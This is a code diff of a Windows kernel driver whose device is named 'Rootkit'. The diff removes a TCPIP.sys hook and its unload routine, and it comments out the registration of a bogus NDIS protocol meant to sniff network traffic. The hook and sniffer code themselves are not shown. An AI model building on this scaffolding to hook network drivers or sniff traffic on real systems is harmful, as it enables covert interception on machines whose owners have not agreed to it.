@@ -1,18 +1,10 @@
 #include "driver.h"
-#include "ndis_sniff.h"
-
 
 DRIVER_INITIALIZE DriverEntry;
 DRIVER_UNLOAD DriverUnload;
 
 UNICODE_STRING  usDeviceName = RTL_CONSTANT_STRING(L"\\Device\\Rootkit");
 UNICODE_STRING  usSymbolicLink = RTL_CONSTANT_STRING(L"\\DosDevices\\Rootkit");
-
-
-//
-//  NDIS Globals:
-//
-NDISPROT_GLOBALS Globals = { 0 };
 
 
 // Driver Entry point
@@ -57,15 +49,8 @@ NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING Regi
 		IoDeleteDevice(deviceObject);
 		return status;
 	} 
-	
-	// Hook the TCPIP.sys driver
-	if (!NT_SUCCESS(TCPHook())) {
 
-		// On failure, delete our device and return
-		IoDeleteDevice(deviceObject);
-		return status;
-	}
-
+	/*
 	// Register our low-level NDIS Protocol
 	// to sniff on the wire
 	if (!NT_SUCCESS(BogusProtocolRegister())) {
@@ -73,7 +58,8 @@ NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING Regi
 		// On failure, delete our device and return
 		IoDeleteDevice(deviceObject);
 		return status;
-	}
+	} */
+
 
 	// Create reference to unload Driver
 	DriverObject->DriverUnload = DriverUnload;
@@ -86,16 +72,10 @@ NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING Regi
 // Driver unload point
 VOID DriverUnload(_In_ PDRIVER_OBJECT DriverObject) {
 	
+	UNREFERENCED_PARAMETER(DriverObject);
 	
-	NTSTATUS status = STATUS_SUCCESS;
-	
-	// Remove the TCP hook
-	status = RemoveTCPHook(DriverObject);
-	
-	// Check to ensure the hook has been removed properly
-	if (!NT_SUCCESS(status)) {
-		KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "Hook not removed\n"));
-	}
+
+	//BogusProtocolUnregister();
 
 	// Delete our driver device and the associated symbolic link 
 	IoDeleteSymbolicLink(&usSymbolicLink);
